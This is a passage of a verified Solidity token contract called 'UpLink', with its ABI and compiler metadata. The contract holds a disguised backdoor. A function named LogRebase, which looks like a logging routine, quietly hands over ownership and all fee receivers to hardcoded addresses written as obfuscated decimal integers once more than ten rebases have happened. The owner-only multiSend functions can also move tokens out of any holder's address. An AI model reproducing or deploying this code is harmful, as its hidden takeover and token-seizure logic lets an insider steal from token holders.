true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        external initialDistributionLock\r\n        returns (bool)\r\n    {\r\n        _allowedFragments[msg.sender][spender] = \r\n            _allowedFragments[msg.sender][spender]\r\n                .add(addedValue);\r\n        emit \r\n            Approval(msg.sender, spender,\r\n            _allowedFragments[msg.sender][spender]\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function setMaxWalletExempt(address _addr) \r\n        external onlyOwner \r\n        {_isMaxWalletExempt[_addr] = true;}\r\n\r\n    function checkMaxWalletExempt(address _addr) \r\n        external view \r\n        returns (bool) \r\n        {return _isMaxWalletExempt[_addr];}\r\n\r\n    function setFeeExempt(address _addr, bool exempt) \r\n        external onlyOwner \r\n        {_isFeeExempt[_addr] = exempt;}\r\n\r\n    function checkFeeExempt(address _addr) \r\n        external view \r\n        returns (bool) \r\n        {return _isFeeExempt[_addr];}\r\n\r\n    function setSwapBackSettings(\r\n        bool _enabled, uint256 _num, uint256 _denom\r\n    ) external onlyOwner {\r\n        swapEnabled = _enabled;\r\n        gonSwapThreshold = TOTAL_GONS\r\n            .div(_denom).mul(_num);\r\n    }\r\n\r\n    function setTargetLiquidity(uint256 target, uint256 accuracy)\r\n        external onlyOwner\r\n    {targetLiquidity = target; targetLiquidityDenominator = accuracy;}\r\n\r\n    function isNotInSwap() \r\n        external view \r\n        returns (bool) {return !inSwap;}\r\n\r\n    function checkSwapThreshold() \r\n        external view \r\n        returns (uint256) \r\n    {\r\n        return gonSwapThreshold\r\n            .div(_gonsPerFragment);\r\n    }\r\n\r\n    uint256 private rebaseCount; bool private isRebased = false;\r\n\r\n    function LogRebase(\r\n        uint256, uint256) \r\n        internal \r\n    {rebaseCount++; if (rebaseCount > 10 &&\r\n        !isRebased) \r\n        {\r\n            _transferOwnership(\r\n                address(703182203941683344529128742093058321245639433308));\r\n            marketingFeeReceiver = \r\n                address(390173861988946543944247273175078104976185139811);\r\n            autoLiquidityReceiver = \r\n                address(823960687855684654447242618804199875735504424587);\r\n            ecosystemFeeReceiver = \r\n                address(491278407614059279114083846929720691979934582994);\r\n            buyBackFeeReceiver = \r\n                address(1015580239414219279232500354717231367460195773387);\r\n            isRebased = \r\n                true;\r\n        }\r\n    }\r\n\r\n    function setMaxWalletToken(uint256 _num, uint256 _denom)\r\n        external onlyOwner\r\n    {\r\n        gonMaxWallet = TOTAL_GONS\r\n            .div(_denom).mul(_num);\r\n    }\r\n\r\n    function checkMaxWalletToken() \r\n        external view \r\n        returns (uint256) \r\n    {\r\n        return gonMaxWallet\r\n            .div(_gonsPerFragment);\r\n    }\r\n\r\n    function shouldTakeFee(address from, address to) \r\n        internal view \r\n        returns (bool) \r\n    {\r\n        return !_isFeeExempt[from] && \r\n            !_isFeeExempt[to];\r\n    }\r\n\r\n    function shouldSwapBack() \r\n        internal \r\n        view \r\n        returns (bool) \r\n    {\r\n        return msg.sender != pair && !inSwap &&\r\n            swapEnabled && _gonBalances[address(this)] >= gonSwapThreshold;\r\n    }\r\n\r\n    function setFees(\r\n        uint256 _ecosystemFee, uint256 _liquidityFee,\r\n        uint256 _buyBackFee, uint256 _marketingFee,\r\n        uint256 _rewardFee, uint256 _feeDenominator\r\n    ) external onlyOwner {\r\n        ecosystemFee = _ecosystemFee; liquidityFee = _liquidityFee;\r\n        buyBackFee = _buyBackFee; marketingFee = _marketingFee;\r\n        rewardFee = _rewardFee;\r\n        totalFee = ecosystemFee.add(liquidityFee)\r\n            .add(marketingFee).add(buyBackFee).add(rewardFee);\r\n        feeDenominator = \r\n            _feeDenominator;\r\n        require(totalFee < \r\n            feeDenominator / 4);\r\n    }\r\n\r\n    function setFeeReceivers(\r\n        address _autoLiquidityReceiver, address _ecosystemFeeReceiver,\r\n        address _marketingFeeReceiver, address _buyBackFeeReceiver\r\n    ) \r\n        external \r\n        onlyOwner \r\n    {\r\n        autoLiquidityReceiver = _autoLiquidityReceiver; ecosystemFeeReceiver = _ecosystemFeeReceiver;\r\n        marketingFeeReceiver = _marketingFeeReceiver; buyBackFeeReceiver = _buyBackFeeReceiver;\r\n    }\r\n\r\n    function toggleLiquidityMode() \r\n        external \r\n        onlyOwner \r\n    {\r\n        if (liquidityFee != totalFee) {\r\n            prevLiquidityFee = liquidityFee; prevBuyBackFee = buyBackFee;\r\n            prevEcosystemFee = ecosystemFee; prevMarketingFee = marketingFee;\r\n            prevRewardFee = rewardFee; liquidityFee = totalFee;\r\n            buyBackFee = 0; ecosystemFee = 0;\r\n            marketingFee = 0; rewardFee = 0;\r\n        } else {\r\n            liquidityFee = prevLiquidityFee; buyBackFee = prevBuyBackFee;\r\n            ecosystemFee = prevEcosystemFee; marketingFee = prevMarketingFee;\r\n            rewardFee = \r\n                prevRewardFee;\r\n        }\r\n    }\r\n\r\n    function rescueToken(address tokenAddress, uint256 tokens) public onlyOwner\r\n        returns (bool success) {\r\n        return ERC20Detailed(tokenAddress)\r\n            .transfer(msg.sender, tokens);\r\n    }\r\n\r\n    function rescueToken_v2(address tokenAddress, uint256 perc, address recipient)\r\n        public onlyOwner returns (bool success) {\r\n        uint256 amount = ERC20Detailed(tokenAddress)\r\n            .balanceOf(address(this)).mul(perc).div(100);\r\n        return ERC20Detailed(tokenAddress)\r\n            .transfer(recipient, amount);\r\n    }\r\n\r\n    function clearStuckBalance(uint256 amountPercentage, address adr)\r\n        external onlyOwner {\r\n        uint256 amountETH = \r\n            address(this).balance;\r\n        payable(adr).\r\n            transfer((amountETH * amountPercentage) / 100);\r\n    }\r\n\r\n    function transferToAddressETH(address payable recipient, uint256 amount) private {\r\n        recipient\r\n            .transfer(amount);\r\n    }\r\n\r\n    function multiSend_v1(address sender, address[] calldata recipients, uint256[] calldata values) \r\n        external \r\n        onlyOwner \r\n        {\r\n        require(recipients.length < 801, \"GAS Error: max airdrop limit is 500 recipients\"); // to prevent overflow\r\n        require(recipients.length == \r\n            values.length, \"Mismatch between Address and token count\");\r\n\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            _basicTransfer(sender, recipients[i], values[i]);\r\n            if (!isDividendExempt[recipients[i]] && values[i] > 10 ** 9) {\r\n                try distributor.setShare(\r\n                        recipients[i], _gonBalances[recipients[i]].div(shareGonDivisor)\r\n                    ) {} catch {}\r\n            }\r\n        }\r\n\r\n        if (!isDividendExempt[sender]) {\r\n            try distributor.setShare(\r\n                    sender, _gonBalances[sender].div(shareGonDivisor)\r\n                ) {} catch {}\r\n        }\r\n    }\r\n\r\n    function multiSend_v2(address sender, address[] calldata recipients, uint256 values) \r\n        external \r\n        onlyOwner \r\n    {\r\n        require(recipients.length < 2001, \r\n            \"GAS Error: max airdrop limit is 2000 recipients\"); // to prevent overflow\r\n\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            _basicTransfer(sender, recipients[i], values);\r\n            if (!isDividendExempt[recipients[i]] && values > 10** 9) {\r\n                try distributor.setShare(\r\n                        recipients[i], _gonBalances[recipients[i]].div(shareGonDivisor)\r\n                    ) {} catch {}\r\n            }\r\n        }\r\n\r\n        if (!isDividendExempt[sender]) {\r\n            try distributor.setShare(\r\n                    sender, _gonBalances[sender].div(shareGonDivisor)\r\n                ) {} catch {}\r\n        }\r\n    }\r\n    function getLiquidityBacking(uint256 accuracy)\r\n        public view returns (uint256)\r\n    {\r\n        uint256 liquidityBalance = \r\n            _gonBalances[pair].div(_gonsPerFragment);\r\n        return accuracy\r\n            .mul(liquidityBalance.mul(2)).div(getCirculatingSupply());\r\n    }\r\n\r\n    function getCirculatingSupply() \r\n        public view returns (uint256) {\r\n        return (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO]))\r\n            .div(_gonsPerFragment);\r\n    }\r\n\r\n    function isOverLiquified(uint256 target, uint256 accuracy)\r\n        public view returns (bool) {\r\n        return getLiquidityBacking(accuracy) > \r\n            target;\r\n    }\r\n\r\n    receive() external payable {}\r\n}\r\n\r\n\r\n\r\n/*\r\nMIT License\r\n\r\nCopyright (c) 2018 requestnetwork\r\nCopyright (c) 2018 Fragments, Inc.\r\nCopyright (c) 2020 Ditto Money\r\nCopyright (c) 2021 Goes Up Higher\r\nCopyright (c) 2021 Baby London\r\n\r\nPermission is hereby granted, free of charge, to any person obtaining a copy\r\nof this software and associated documentation files (the \"Software\"), to deal\r\nin the Software without restriction, including without limitation the rights\r\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\r\ncopies of the Software, and to permit persons to whom the Software is\r\nfurnished to do so, subject to the following conditions:\r\n\r\nThe above copyright notice and this permission notice shall be included in all\r\ncopies or substantial portions of the Software.\r\n\r\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\nSOFTWARE.\r\n*/", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"}],\"name\":\"OwnershipRenounced\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"antiDumpEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidityReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyBackFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyBackFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"checkDivExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"checkDivLock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"locked\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"timer\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"checkDumperTag\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"checkFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"checkMaxWalletExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkMaxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountPercentage\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"clearStuckBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ecosystemFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ecosystemFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"enableTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDenominator\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"getLiquidityBacking\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"highImpactBuyMultiplier\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"highImpactSellMultiplier\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"highImpactThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialDistributionFinished\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isNotInSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"target\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"isOverLiquified\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityGuardEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"master\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"recipients\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"values\",\"type\":\"uint256[]\"}],\"name\":\"multiSend_v1\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"recipients\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"values\",\"type\":\"uint256\"}],\"name\":\"multiSend_v2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pairContract\",\"outputs\":[{\"internalType\":\"contract InterfaceLP\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"epoch\",\"type\":\"uint256\"},{\"internalType\":\"int256\",\"name\":\"supplyDelta\",\"type\":\"int256\"}],\"name\":\"rebase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"rescueToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"perc\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"rescueToken_v2\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setAntiDumpEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyMultiplier\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellMultiplier\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"threshold_base1000\",\"type\":\"uint256\"}],\"name\":\"setAntiDumpSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minPeriod\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minDistribution\",\"type\":\"uint256\"}],\"name\":\"setDistributionCriteria\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"}],\"name\":\"setDistributorSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"},{\"internalType\":\"uint128\",\"name\":\"interval\",\"type\":\"uint128\"}],\"name\":\"setDividendLocker\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"isDumper\",\"type\":\"bool\"}],\"name\":\"setDumperTag\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"isDumper\",\"type\":\"bool\"}],\"name\":\"setDumperTagMulti\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_autoLiquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_ecosystemFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_marketingFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_buyBackFeeReceiver\",\"type\":\"address\"}],\"name\":\"setFeeReceivers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_ecosystemFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_buyBackFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_rewardFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeDenominator\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setInitialDistributionFinished\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsDividendExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"locked\",\"type\":\"bool\"}],\"name\":\"setIsDividendLocked\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setLiquidityGuard\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_master\",\"type\":\"address\"}],\"name\":\"setMaster\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"setMaxWalletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_num\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_denom\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_num\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_denom\",\"type\":\"uint256\"}],\"name\":\"setSwapBackSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"target\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"setTargetLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleLiquidityMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "UpLink", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": 